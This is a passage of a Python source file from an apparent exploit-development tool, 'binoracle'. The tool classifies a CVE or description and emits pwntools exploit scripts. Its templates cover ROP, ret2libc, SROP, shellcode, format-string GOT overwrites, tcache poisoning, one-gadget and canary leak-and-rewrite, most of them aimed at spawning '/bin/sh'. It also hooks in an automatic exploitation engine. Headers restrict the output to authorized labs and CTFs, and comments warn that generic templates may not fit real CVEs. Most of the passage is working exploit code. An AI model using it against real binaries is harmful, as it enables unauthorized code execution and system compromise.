            "Construir la cadena (ROP)" if es else "Build the chain (ROP)",
            "reutilizar codigo: encadenar gadgets" if es else "reuse code: chain gadgets",
            "ret2libc system('/bin/sh') o execve por syscall; SROP si faltan gadgets" if es else
            "ret2libc system('/bin/sh') or execve via syscall; SROP if gadgets are scarce",
            "gadgets `pop rdi; ret`, `syscall` y '/bin/sh' (o libc con leak)" if es else
            "`pop rdi; ret`, `syscall` gadgets and '/bin/sh' (or leaked libc)"))
    else:
        P.append(Phase(
            "Shellcode" if es else "Shellcode",
            "ejecutar shellcode inyectado" if es else "run injected shellcode",
            "NX desactivado: salta a la pila/heap con el shellcode" if es else
            "NX off: jump to the stack/heap holding the shellcode", ""))
    P.append(Phase(
        "Objetivo" if es else "Target",
        "shell / lectura de flag / RCE" if es else "shell / flag read / RCE",
        "system('/bin/sh'), execve, o open+read+write del flag (si hay seccomp)" if es else
        "system('/bin/sh'), execve, or open+read+write the flag (under seccomp)", ""))
    return P


def _generic_phases(cls: str, es: bool) -> List[Phase]:
    return [
        Phase("Reconocimiento" if es else "Recon", "entender la vulnerabilidad y su alcance" if es else
              "understand the vulnerability and its reach",
              "localizar el codigo afectado, la entrada que lo dispara y las mitigaciones" if es else
              "locate the affected code, the triggering input and the mitigations"),
        Phase("Primitiva" if es else "Primitive", "convertir el bug en una primitiva util" if es else
              "turn the bug into a useful primitive",
              "leer/escribir controlado, corrupcion de estado, o fuga" if es else
              "controlled read/write, state corruption, or leak"),
        Phase("Objetivo" if es else "Target", "impacto: RCE / fuga / escalada" if es else
              "impact: RCE / leak / escalation",
              "encadenar la primitiva hasta el objetivo del ejercicio" if es else
              "chain the primitive to the exercise goal"),
    ]


def plan(text: str, facts: Optional[dict] = None, cve: str = "", lang: str = "es",
        has_public_exploit: bool = False, poc_ref_url: str = "") -> ExploitPlan:
    """Construye el esquema de explotacion para la CVE/descripcion. `facts` (checksec del binario)
    concreta las mitigaciones. No lanza.

    `has_public_exploit`/`poc_ref_url`: si quien llama YA SABE (via cvelookup.fetch_cve) que esta
    CVE tiene un exploit publico documentado, se lo dice al desarrollador de exploits (ver
    `develop_exploit`) para que anteponga esa realidad en vez de dejar que una plantilla GENERICA
    (p.ej. la de heap, que asume un reto CTF con menu interactivo alloc/free/show) se presente como
    si fuera LA tecnica real de esta CVE -- bug real encontrado investigando CVE-2021-3156 (Baron
    Samedit, un off-by-one en el parseo de argv/getenv de un setuid real, sin menu ni interfaz
    stdin de ningun tipo): el heap-overflow generico no tiene nada que ver con la tecnica real."""
    es = lang == "es"
    facts = facts or {}
    cls = classify_cve(text) or classify_cve(cve)
    if not cls:
        return ExploitPlan(note=("no se reconocio la clase de vulnerabilidad en el texto"
                                 if es else "vulnerability class not recognized in the text"))
    prim = next((p for c, _k, p, _r in _CLASSES if c == cls), "")
    refs = next((r for c, _k, _p, r in _CLASSES if c == cls), [])
    pl = ExploitPlan(vuln_class=cls, cve=cve, primitive=prim, kb_refs=refs)
    mem = cls in ("stack-overflow", "heap-overflow", "uaf", "double-free", "format-string",
                  "oob-write", "type-confusion")
    pl.phases = _mem_phases(cls, facts, es) if mem else _generic_phases(cls, es)
    # mitigaciones a sortear (concretadas si hay facts)
    if facts:
        for _k, on, how_es, how_en in (
            ("canary", facts.get("canary") is True, "hay canary -> necesitas fugarlo o brute (fork)",
             "canary present -> leak or brute-force it (fork)"),
            ("pie", facts.get("pie") is True, "PIE/ASLR -> necesitas un leak de la base",
             "PIE/ASLR -> you need a base leak"),
            ("nx", facts.get("nx") is not False, "NX -> reutiliza codigo (ROP/ret2libc), no shellcode",
             "NX -> reuse code (ROP/ret2libc), not shellcode"),
            ("relro", str(facts.get("relro", "")).lower() == "full",
             "Full RELRO -> sin GOT overwrite: usa FSOP/__free_hook/exit-handlers",
             "Full RELRO -> no GOT overwrite: use FSOP/__free_hook/exit-handlers")):
            if on:
                pl.mitigations.append(how_es if es else how_en)
    # el desarrollador de exploits genera una plantilla funcional para la clase (sin binario: sin
    # offset concreto, se resuelve en el propio script). plan_from_analysis la sustituye por el
    # script anclado a la prueba si luego hay una cadena verificada.
    # Una clase WEB no es corrupcion de memoria: no hay 'binario' ni pwntools que montar aqui. El
    # PoC (peticion HTTP) lo construye cve_agent con webexploit.py, que tiene el endpoint/metodo/
    # parametros de la hipotesis del LLM; dejamos el script vacio para no generar un esqueleto
    # pwntools que no tiene sentido (un process(BINARY) que no existe).
    pl.script = "" if is_web_class(cls) else develop_exploit(
        cls, facts, {}, lang=lang, has_public_exploit=has_public_exploit, poc_ref_url=poc_ref_url)
    return pl


def _dev_header(name: str, tag: str) -> list:
    return ["#!/usr/bin/env python3",
            "# binoracle: exploit desarrollado - SOLO laboratorio/CTF autorizado",
            f"# {tag}",
            "from pwn import *",
            "context.update(arch='amd64', os='linux')",
            f"BINARY = './{name}'",
            "elf = context.binary = ELF(BINARY, checksec=False)",
            "# libc = ELF('./libc.so.6', checksec=False)   # <-- si es remoto, pon aqui la libc",
            "io = process(BINARY)   # o: io = remote('HOST', PORT)",
            "# VECTOR DE ENTRADA: el esqueleto de abajo asume que el payload se manda por stdin",
            "# (io.sendline(...)). Un programa real puede dispararse por argv, una variable de",
            "# entorno, un fichero, o una peticion de red en vez de stdin -- confirma el vector real",
            "# antes de lanzar esto: p.ej. io = process([BINARY, payload]) para argv."]


def _srop_lines(indent: str = "") -> list:
    """Bloque SROP (sigreturn-oriented programming): con un `syscall; ret` y control de RAX=15
    (rt_sigreturn) se monta un sigcontext falso que fija TODOS los registros a la vez. Util en
    binarios estaticos/minimos con pocos gadgets. Ejecuta execve('/bin/sh')."""
    L = ["# --- SROP: fija todos los registros con un sigcontext falso (rt_sigreturn = RAX 15) ---",
         "srop_rop = ROP(elf)",
         "pop_rax = srop_rop.find_gadget(['pop rax', 'ret'])          # para poner RAX = 15",
         "syscall_ret = srop_rop.find_gadget(['syscall', 'ret']) or srop_rop.find_gadget(['syscall'])",
         "binsh_addr = next(elf.search(b'/bin/sh\\x00'), 0)           # '/bin/sh' embebido o en .bss",
         "frame = SigreturnFrame()",
         "frame.rax = constants.SYS_execve                            # 59: execve('/bin/sh', 0, 0)",
         "frame.rdi = binsh_addr",
         "frame.rsi = 0",
         "frame.rdx = 0",
         "frame.rip = syscall_ret.address                             # el sigreturn salta aqui",
         "# cadena: pop rax; ret ; 15 ; syscall(rt_sigreturn) ; <sigcontext falso>",
         "chain  = p64(pop_rax.address) + p64(15) + p64(syscall_ret.address) + bytes(frame)",
         "io.sendline(flat({OFFSET: chain}))",
         "io.interactive()"]
    return [indent + x for x in L]


def _onegadget_lines(libc_var: str = "libc", indent: str = "") -> list:
    """Bloque one-gadget: una sola direccion de libc que da execve('/bin/sh') si se cumplen sus
    constraints (p.ej. [rsp+0x40]==NULL). Evita montar toda la cadena ret2libc cuando ya hay leak."""
    L = ["# --- one-gadget: execve('/bin/sh') con UNA direccion de libc (revisa constraints) ---",
         "# instala one_gadget y busca los candidatos:  one_gadget ./libc.so.6",
         "one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]   # <-- offsets reales de tu libc (one_gadget)",
         f"og = {libc_var}.address + one_gadgets[0]     # prueba cada uno hasta cumplir constraints",
         "# uso tipico: sobreescribe un puntero de retorno / __free_hook / __malloc_hook con 'og'"]
    return [indent + x for x in L]


def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                    lang: str = "es", has_public_exploit: bool = False,
                    poc_ref_url: str = "") -> str:
    """Desarrollador de exploits multi-clase: genera un script pwntools FUNCIONAL (o la aproximacion
    mas cercana) para CUALQUIER clase de vulnerabilidad, adaptado a las mitigaciones (checksec) y a
    la concrecion del binario (offset/gadgets si se conocen). No requiere cadena verificada: es la
    plantilla de trabajo que el analista completa donde queda un TODO (leak/target). Para
    stack-overflow verificado se prefiere _pwn_script_from_proof (anclado a la prueba).

    `has_public_exploit`/`poc_ref_url`: cuando ya se sabe que ESTA CVE tiene un exploit publico
    documentado, se antepone un aviso dirigiendo a ESE PoC real -- las plantillas genericas de
    heap/UAF/double-free de abajo asumen un reto CTF con menu interactivo (alloc/free/show por
    stdin); para un PROGRAMA REAL (no un reto hecho para practicar) esa interfaz casi nunca existe,
    y presentarla sin avisar como si fuera "el" exploit de la CVE es activamente engañoso. Bug real
    encontrado investigando CVE-2021-3156 (Baron Samedit): es un off-by-one en el parseo de
    argv/getenv de un `sudo` setuid real -- ni remotamente parecido a un menu de alloc/free/show."""
    facts = facts or {}
    concrete = concrete or {}
    es = lang == "es"
    _poc_notice = ""
    if has_public_exploit:
        _poc_notice = (
            (f"# AVISO: esta CVE YA TIENE un exploit publico documentado"
             f"{f' ({poc_ref_url})' if poc_ref_url else ''}.\n"
             f"# USA ESE PoC real en vez de este esqueleto -- la plantilla generica de abajo\n"
             f"# NO conoce la tecnica real de esta CVE concreta (solo asume la forma tipica\n"
             f"# de su CLASE de vulnerabilidad); para un programa real (no un reto CTF) puede\n"
             f"# no aplicar en absoluto -- confirmado en vivo con CVE-2021-3156 (Baron Samedit):\n"
             f"# su plantilla de clase 'heap-overflow' asume un menu interactivo alloc/free/show\n"
             f"# que un sudo real, explotado via argv/getenv, nunca tiene.\n") if es else
            (f"# NOTICE: this CVE ALREADY HAS a documented public exploit"
             f"{f' ({poc_ref_url})' if poc_ref_url else ''}.\n"
             f"# USE that real PoC instead of this skeleton -- the generic template below does\n"
             f"# NOT know this specific CVE's real technique (it only assumes the typical shape\n"
             f"# of its vulnerability CLASS); for a real-world program (not a CTF challenge) it\n"
             f"# may not apply at all -- confirmed live with CVE-2021-3156 (Baron Samedit): its\n"
             f"# 'heap-overflow' class template assumes an interactive alloc/free/show menu that\n"
             f"# a real sudo, exploited via argv/getenv, never has.\n"))
    nx = facts.get("nx") is not False           # NX activo salvo que checksec diga lo contrario
    canary = facts.get("canary") is True
    pie = facts.get("pie") is True
    off = concrete.get("offset")
    off_line = f"OFFSET = {off}" if off is not None else \
        "OFFSET = cyclic_find(0x6161616c)   # <-- resuelve el offset (patron ciclico / binoracle cyclic)"

    if cls == "stack-overflow":
        tag = "clase: stack overflow -> control de RIP"
        pre = [off_line]
        if canary:
            pre.append("# CANARY activo: necesitas fugarlo (leak) o brute-force byte a byte (fork servers)")
        if not nx:
            body = pre + ["# NX DESACTIVADO -> ret2shellcode: inyecta shellcode y salta a el",
                          "sc = asm(shellcraft.sh())",
                          "# necesitas la direccion del buffer (leak o ASLR off). Ejemplo con leak conocido:",
                          "buf = 0xdeadbeef   # <-- direccion del buffer que contiene 'sc'",
                          "payload = sc.ljust(OFFSET, b'\\x90') + p64(buf)",
                          "io.sendline(payload)", "io.interactive()"]
        elif pie:
            body = pre + ["# PIE: necesitas un leak de la base del binario para direccionar win/gadgets",
                          "# elf.address = leak - offset_conocido",
                          "rop = ROP(elf)",
                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
                          "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
                          "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
        else:
            # NX on, no-PIE: 4 estrategias en cascada segun lo que tenga el binario
            # (A) ret2win  (B) ret2libc estatico  (C) execve por ROP  (D) SROP si faltan gadgets
            body = pre + ["rop = ROP(elf)",
                          "win = elf.sym.get('win') or elf.sym.get('flag') or elf.sym.get('shell')",
                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
                          "if win:",
                          "    ret = next(elf.search(asm('ret'), executable=True), 0)  # alinea 16B",
                          "    io.sendline(flat({OFFSET: [ret, win]}))              # (A) ret2win",
                          "    io.interactive()",
                          "elif sysaddr and binsh:",
                          "    rop.call(sysaddr, [binsh])                           # (B) ret2libc estatico",
                          "    io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
                          "else:",
                          "    try:",
                          "        rop.rax=0x3b; rop.rdi=binsh; rop.rsi=0; rop.rdx=0",
                          "        rop.raw(rop.find_gadget(['syscall','ret']).address)  # (C) execve por ROP",
                          "        io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
                          "    except Exception:",
                          "        # (D) SROP: pocos gadgets -> sigcontext falso (rt_sigreturn)"]
            body += _srop_lines("        ")
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    if cls == "format-string":
        tag = "clase: format string -> lectura/escritura arbitraria (%n)"
        body = ["# 1) localiza el offset del argumento controlado (posicion en la pila):",
                "#    for i in range(1,40): p=process(BINARY); p.sendline('%%%d$p'%i); print(i,p.recvline())",
                "OFFSET = 6   # <-- posicion hallada del buffer en la pila",
                "# 2) fuga (derrota PIE/ASLR) leyendo un puntero conocido:",
                # bug real: bytes no tiene .format() en Python 3 (solo str) -- esto lanzaba
                # AttributeError en cuanto se ejecutaba, antes de llegar siquiera al leak.
                "io.sendline(('%%%d$p' % OFFSET).encode())",
                "leak = int(io.recvline().strip(), 16)   # <-- ajusta el objetivo del leak",
                "# 3) ESCRITURA arbitraria: pisa GOT (p.ej. exit->win/system) con fmtstr_payload:",
                "target = elf.got.get('exit') or elf.got.get('printf')",
                "value  = elf.sym.get('win') or elf.sym.get('system') or 0x0",
                "payload = fmtstr_payload(OFFSET, {target: value})",
                "io.sendline(payload)", "io.interactive()"]
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    if cls in ("heap-overflow", "uaf", "double-free"):
        tag = f"clase: {cls} -> corrupcion de heap (tcache/fastbin poisoning)"
        body = ["# CAVEAT ESTRUCTURAL (siempre, haya o no exploit publico conocido): este esqueleto",
                "# asume un reto CTF con menu interactivo (alloc/free/show por numero de opcion sobre",
                "# stdin) -- la forma MAS COMUN de practicar esta clase, pero NO la unica. Un programa",
                "# real rara vez tiene ese menu: el disparador puede ser un argumento de linea de",
                "# comandos, una peticion de red, un fichero, una variable de entorno... Si esto no es",
                "# un reto con ese menu, NO copies los wrappers de abajo tal cual -- usa el layout de",
                "# heap real (que asignas, que liberas, que filtras) segun COMO se dispara de verdad",
                "# la vulnerabilidad en el programa concreto.",
                "# Exploit de heap para glibc con tcache (>=2.26). Adapta los wrappers del menu del reto",
                "# (indices de opcion, prompts) a la interfaz real del binario.",
                "def alloc(i, sz, data=b'A'):",
                "    io.sendlineafter(b'>', b'1')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "    io.sendlineafter(b'size', str(sz).encode())",
                "    io.sendafter(b'data', data)",
                "def free(i):",
                "    io.sendlineafter(b'>', b'2')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "def show(i):",
                "    io.sendlineafter(b'>', b'3')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "",
                "# 1) LEAK libc: libera un chunk grande (>0x420) al unsorted bin; sus fd/bk apuntan a",
                "#    main_arena. Con UAF, show() sobre el chunk liberado filtra ese puntero.",
                "alloc(0, 0x428); alloc(1, 0x18)   # el 2o evita consolidar con el top",
                "free(0); show(0)",
                "libc.address = u64(io.recvline().strip().ljust(8, b'\\x00')) - (libc.sym['main_arena'] + 96)",
                "log.info('libc base: %#x', libc.address)",
                "",
                "# 2) TCACHE poisoning: consigue el mismo chunk dos veces en la lista (double-free o UAF)",
                "#    y reescribe su fd para que malloc devuelva un chunk sobre el objetivo.",
                "#    En glibc>=2.32 el fd va 'mangled': fd = (heap_base>>12) ^ target.",
                "target = libc.sym.get('__free_hook', 0) or libc.sym['_IO_2_1_stdout_']",
                "alloc(2, 0x40); free(2); free(2)          # double-free (o usa UAF)",
                "alloc(3, 0x40, p64(target))               # envenena el fd del tcache",
                "alloc(4, 0x40); alloc(5, 0x40, p64(libc.sym.get('system', 0)))  # 5 cae en el objetivo",
                ""] + _onegadget_lines("libc") + [
                "# alternativa a system(): escribe 'og' (one-gadget) en __free_hook/__malloc_hook",
                "# alloc(5, 0x40, p64(og))",
                "",
                "# 3) DISPARA: si target=__free_hook -> free() de un chunk con '/bin/sh'; si FSOP -> _IO",
                "io.interactive()"]
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    if cls == "oob-write":
        tag = "clase: out-of-bounds write -> write-what-where"
        body = ["# Escritura fuera de limites: un indice negativo/grande escribe donde no debe.",
                "# 1) calcula el indice que alcanza el objetivo (GOT / puntero de retorno / __free_hook):",
                "IDX = 0        # <-- indice que cae sobre el objetivo",
                "VALUE = elf.sym.get('win') or 0   # <-- que escribir",
                "# io.sendlineafter(b'index', str(IDX).encode()); io.sendlineafter(b'value', str(VALUE).encode())",
                "io.interactive()"]
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    if cls == "integer-overflow":
        tag = "clase: integer overflow -> tamano/indice erroneo (overflow secundario)"
        body = ["# Provoca el wrap del entero para forzar una copia/allocacion mayor de lo previsto,",
                "# que degenera en un desbordamiento de pila/heap. Encadena con la clase resultante.",
                "SIZE = 0xffffffff   # <-- valor que hace overflow del contador/tamano",
                "io.interactive()"]
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    if cls == "type-confusion":
        tag = "clase: type confusion -> control de vtable/puntero de funcion"
        body = ["# Confunde el tipo de un objeto para que un puntero de funcion (vtable) apunte a codigo",
                "# controlado. 1) leak para derrotar ASLR; 2) coloca una vtable falsa; 3) dispara la llamada.",
                "io.interactive()"]
        return _poc_notice + "\n".join(_dev_header(name, tag) + body)

    # generico: esqueleto de trabajo
    tag = f"clase: {cls or 'desconocida'} -> plantilla generica de trabajo"
    body = ["# binoracle no tiene plantilla especifica para esta clase; esqueleto de trabajo:",
            "# 1) primitiva (lectura/escritura/control de flujo)  2) leak (ASLR)  3) objetivo (RCE/flag)",
            "io.interactive()"]
    return _poc_notice + "\n".join(_dev_header(name, tag) + body)


# Estrategias de chainanalyzer._verify_chain cuyo mecanismo NO es un ROP de pila generico
# (heap, UAF, tcache, ret2csu, SROP, ret2dlresolve, write-what-where) -- bug real de la misma
# clase que el de canary/format-string: antes de las ramas dedicadas de abajo, CUALQUIER
# estrategia sin una rama propia caia en la rama generica final (system()/execve() via ROP de
# pila con flat({OFFSET: ...})), que fabrica un script con pinta de funcionar pero
# estructuralmente incorrecto para estas tecnicas (algunas ni siquiera tienen "offset" como
# distancia de pila -- confirmado leyendo chainanalyzer.py: los heap exploits no guardan
# "offset" en absoluto, y csu/srop/dlresolve lo guardan pero el mecanismo real no es
# flat({OFFSET: rop.chain()}) sino gadgets __libc_csu_init / un frame sigreturn forjado / un
# resolver dinamico falso -- ninguno de los 3 tiene por que tener un simple "pop rdi; ret",
# que es precisamente por lo que se eligieron esas tecnicas en vez de un ROP directo). En vez de
# fabricar una de esas 3 plantillas bespoke (grandes, con multiples sub-estrategias cada una) se
# degrada honestamente: la cadena SI fue verificada por ejecucion real (ver 'proof'), pero el
# script reproducible exacto es el propio driver ya verificado de ese modulo, no una
# aproximacion de ROP de pila.
_NON_ROP_STRATEGY_HINTS = (
    "house-of", "largebin attack", "tcache stashing unlink", "unsafe-unlink",
    "fastbin-dup", "io_file", "fsop", "tcache-poison", "write-what-where",
    "uaf (reutilizacion", "tcache dup", "ret2csu", "srop (sigreturn", "ret2dlresolve",
)


def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
    """Script pwntools reproducible a partir de la prueba de una cadena verificada."""
    strat = (proof.get("strategy") or "").lower()
    off = proof.get("offset")
    win = proof.get("win")
    base = proof.get("base")
    H = ["#!/usr/bin/env python3",
         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
         f"# estrategia VERIFICADA: {strat}",
         "from pwn import *",
         "context.update(arch='amd64', os='linux')",
         f"BINARY = './{name}'",
         "elf = context.binary = ELF(BINARY, checksec=False)",
         "io = process(BINARY)   # o: remote('HOST', PORT)"]
    if any(kw in strat for kw in _NON_ROP_STRATEGY_HINTS):
        return "\n".join(H + [
            "# Esta cadena fue VERIFICADA por EJECUCION REAL en el sandbox (ver 'proof' en el",
            "# plan) pero su mecanismo no es un ROP de pila generico -- fabricar aqui un script",
            "# con system()/execve() via ROP de pila seria estructuralmente incorrecto para",
            "# esta tecnica (y probablemente no funcionaria: estas tecnicas se eligen",
            "# precisamente cuando NO hay gadgets simples para esa via).",
            "# Reproduce el exploit EXACTO que verifico esta cadena con:",
            f"#   python3 -m binoracle autopwn {name}",
            "# (el driver completo y ya verificado vive en binoracle/workflows/auto<tecnica>.py)"])
    if off is None:
        return "\n".join(H + ["# offset no resuelto"])
    if "ret2win" in strat:
        B = [f"OFFSET = {off}", "ret = next(elf.search(asm('ret'), executable=True), 0)",
             f"payload = flat({{OFFSET: [ret, {win}]}})", "io.sendline(payload)", "io.interactive()"]
    elif "leak" in strat and "canary" not in strat:
        # "leak" tambien aparece en la estrategia de bypass de canary ("canary leak (%s) ->
        # rewrite -> overflow -> win()"), que no tiene nada que ver con fugar libc via puts --
        # bug real encontrado en vivo: sin el "canary" not in strat, un canary bypass caia aqui
        # y generaba un script que llama elf.got['puts'] aunque el binario no importe puts en
        # absoluto (confirmado en vivo contra samples/bin/canleak: KeyError: 'puts' al
        # ejecutarlo). Un bypass de canary cae ahora en la rama generica de abajo, que SI
        # comprueba si system() esta disponible antes de asumirlo.
        B = [f"OFFSET = {off}", "rop = ROP(elf)", "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])",
             "io.sendline(flat({OFFSET: rop.chain()}))",
             "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
             "libc = elf.libc; libc.address = leak - libc.sym['puts']",
             "# opcion 1: ret2libc system('/bin/sh')",
             "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
             "# opcion 2 (one-gadget): og = libc.address + <offset de one_gadget ./libc.so.6>;",
             "#   io.sendline(flat({OFFSET: og}))  # si cumple constraints, mas corto que la cadena",
             "io.sendline(flat({OFFSET: rop2.chain()}))", "io.interactive()"]
    elif "canary" in strat:
        # Bug real encontrado en vivo ejecutando este mismo script contra samples/bin/canleak: el
        # canary se re-aleatoriza en cada exec (incluso con ASLR desactivado), asi que NO se puede
        # fijar como constante en el script -- hay que fugarlo y reescribirlo en el MISMO proceso
        # que hace el overflow final, igual que el driver verificado de autocanary.py. Un overflow
        # directo a OFFSET (sin las dos etapas) dispara "*** stack smashing detected ***" porque el
        # relleno pisa el canary real con basura antes de llegar a la direccion de retorno.
        bufsz = proof.get("bufsz", (off or 8) - 8)
        rbpgap = proof.get("rbpgap", 8)
        needs_align = proof.get("align") == "ret"
        B = [f"BUFSZ = {bufsz}", f"RBPGAP = {rbpgap}", f"WIN = {win}",
             "# etapa 1: fuga -- machaca solo el byte nulo bajo del canary para que el %s",
             "# siguiente siga imprimiendo y revele los 7 bytes altos del canary",
             "io.send(b'A' * BUFSZ + b'B')",
             "io.recvuntil(b'B', timeout=4)",
             "leaked = io.recv(7, timeout=4)",
             "canary = u64(b'\\x00' + leaked)",
             "io.recvrepeat(0.3)",
             "# etapa 2: reescribe el MISMO canary (pasa el check) y sobreescribe RIP con win()",
             ("align = p64(ROP(elf).find_gadget(['ret']).address)" if needs_align else "align = b''"),
             "io.send(b'A' * BUFSZ + p64(canary) + b'A' * RBPGAP + align + p64(WIN))",
             "io.interactive()"]
    elif "format-string" in strat:
        # Bug real encontrado en vivo contra samples/bin/fmt_got: aqui "offset" NO es una distancia
        # de buffer a RIP (lo que la rama generica de abajo asume con flat({OFFSET: ...})) sino el
        # indice %N$p del argumento de printf controlado por el usuario -- lo que fmtstr_payload()
        # necesita. Reutilizar el valor de `system` observado en el sandbox tambien seria fragil
        # (su libc puede diferir de la de este entorno); como el script corre localmente contra EL
        # MISMO binario, se recalcula via elf.libc igual que el driver verificado de autofmt.py.
        got = proof.get("got")
        B = [f"OFFSET = {off}", f"PRINTF_GOT = {got}",
             "libc = io.libc  # libc.address correcto segun /proc/<pid>/maps DEL PROCESO YA ABIERTO;",
             "# elf.libc.symbols daria el offset estatico dentro del fichero (address=0), no la",
             "# direccion real en tiempo de ejecucion -- confirmado en vivo: con elf.libc, el %n",
             "# escribia basura y el programa moria con SIGSEGV al llamar al 'system' resultante",
             "system = libc.symbols['system']",
             "payload = fmtstr_payload(OFFSET, {PRINTF_GOT: system}, write_size='byte')",
             "io.sendline(payload)             # printf(payload) -> printf@GOT = system",
             "io.recvrepeat(0.5)",
             "io.sendline(b'/bin/sh')          # printf('/bin/sh') -> system('/bin/sh')",
             "io.interactive()"]
    elif "pie" in strat:
        B = [f"OFFSET = {off}", f"elf.address = {base or 0}  # sandbox ASLR-off (con ASLR real: leak)",
             "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
             "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
    else:
        B = [f"OFFSET = {off}", "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
             "io.sendline(flat({OFFSET: rop.chain()}))", "io.interactive()"]
    return "\n".join(H + B)


def plan_from_analysis(an, facts: dict, binary_name: str = "target", text: str = "",
                       cve: str = "", lang: str = "es", has_public_exploit: bool = False,
                       poc_ref_url: str = "") -> ExploitPlan:
    """Construye el esquema a partir de un ChainAnalysis YA calculado (sin re-ejecutar el sandbox).
    Para el informe/audit, que ya corre analyze_chains con verify. Concreta offset/gadgets/objetivo
    y, si hay cadena verificada, adjunta prueba + script pwntools."""
    import os
    es = lang == "es"
    cls = classify_cve(text) or classify_cve(cve)
    if not cls and an is not None and getattr(an, "control", {}).get("RIP"):
        cls = "stack-overflow"
    if not cls:
        return plan(text or cve, facts, cve=cve, lang=lang,
                   has_public_exploit=has_public_exploit, poc_ref_url=poc_ref_url)
    pl = plan(text or ("stack overflow" if cls == "stack-overflow" else cls), facts, cve=cve,
             lang=lang, has_public_exploit=has_public_exploit, poc_ref_url=poc_ref_url)
    pl.vuln_class = cls
    if an is not None:
        ctrl = an.control
        gd = ctrl.get("reg_gadgets") or {}
        pl.concrete = {"offset": ctrl.get("rip_offset"),
                       "reg_gadgets": {k: v.get("addr") for k, v in gd.items()},
                       "pivot": ctrl.get("pivot_gadget"), "target": an.target,
                       "gadgets_total": len(an.gadgets)}
        vc = next((c for c in an.chains if getattr(c, "verified", False)), None)
        if vc is not None:
            pl.verified = True
            pl.proof = vc.proof or {}
            pl.concrete["chain"] = vc.name
            pl.script = _pwn_script_from_proof(pl.proof, os.path.basename(binary_name))
            pl.phases.append(Phase(
                "Exploit VERIFICADO" if es else "VERIFIED exploit",
                (f"cadena {vc.name} ejecutada en sandbox -> objetivo alcanzado" if es else
                 f"chain {vc.name} executed in sandbox -> goal reached"),
                (f"prueba: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"),
                "script pwntools adjunto" if es else "attached pwntools script"))
    # Si no hubo cadena verificada, el DESARROLLADOR de exploits genera igualmente un script
    # funcional (o la aproximacion mas cercana) para la clase, adaptado a las mitigaciones.
    if not pl.script:
        pl.script = develop_exploit(cls, facts, pl.concrete, name=os.path.basename(binary_name),
                                   lang=lang, has_public_exploit=has_public_exploit,
                                   poc_ref_url=poc_ref_url)
        pl.phases.append(Phase(
            "Exploit desarrollado (plantilla)" if es else "Developed exploit (template)",
            ("script pwntools funcional para la clase, a completar donde queda TODO (leak/objetivo)"
             if es else
             "functional pwntools script for the class, complete it where a TODO remains (leak/target)"),
            "desarrollador multi-clase de binoracle" if es else "binoracle multi-class developer",
            "aproximacion no verificada en sandbox" if es else "approximation not sandbox-verified"))
    return pl


def _parse_kv_detail(detail: str) -> dict:
    """Autopwn's winning-attempt detail strings are space-separated `key=value` pairs (e.g.
    "offset=72 win=0x401176", "VERIFIED offset=6 system=0x... printf_got=0x...") -- turns one
    into a dict so it can populate ExploitPlan.proof the same way a chainanalyzer chain's own
    `.proof` dict already does."""
    out = {}
    for m in re.finditer(r"(\w+)=(\S+)", detail or ""):
        out[m.group(1)] = m.group(2)
    return out


def _augment_with_autopwn(pl: "ExploitPlan", binary: str, lang: str, verify: bool) -> None:
    """Si el Analizador de cadenas (chainanalyzer) no verifico ningun exploit, prueba TAMBIEN
    el motor completo de `autopwn` -- 29 tecnicas (ret2win, ret2libc, format-string, SROP,
    ret2csu, pivot, dl-resolve, y las ~15 de heap: house-of-*, fastbin-dup, tcache-*,
    unsafe-unlink, iofile-fsop...) frente a las ~6 cadenas que chainanalyzer modela. Investigar
    una CVE de un binario real (via `investigate_cve`) merece el motor COMPLETO, no solo el
    subconjunto que el analizador de cadenas sabe construir. Muta `pl` in-place SOLO si encuentra
    un exploit verificado que chainanalyzer no encontro; nunca sobreescribe una verificacion que
    ya existia."""
    if pl.verified or not verify:
        return
    es = lang == "es"
    try:
        from .autopwn import autopwn
        res = autopwn(binary, run=True)
    except Exception:
        return
    if not res.win_exploit:
        return
    hit = next(((n, ok, d) for n, ok, d in res.attempts if ok is True), None)
    if hit is None:
        return
    name, _, detail = hit
    pl.verified = True
    pl.proof = _parse_kv_detail(detail)
    pl.concrete["chain"] = name
    pl.script = (f"# Exploit VERIFICADO por binoracle autopwn (tecnica: {name}).\n"
                 f"# Para el script pwntools reproducible completo y la traza, corre:\n"
                 f"#   binoracle autopwn {binary}\n" if es else
                 f"# Exploit VERIFIED by binoracle autopwn (technique: {name}).\n"
                 f"# For the full reproducible pwntools script and trace, run:\n"
                 f"#   binoracle autopwn {binary}\n")
    pl.phases.append(Phase(
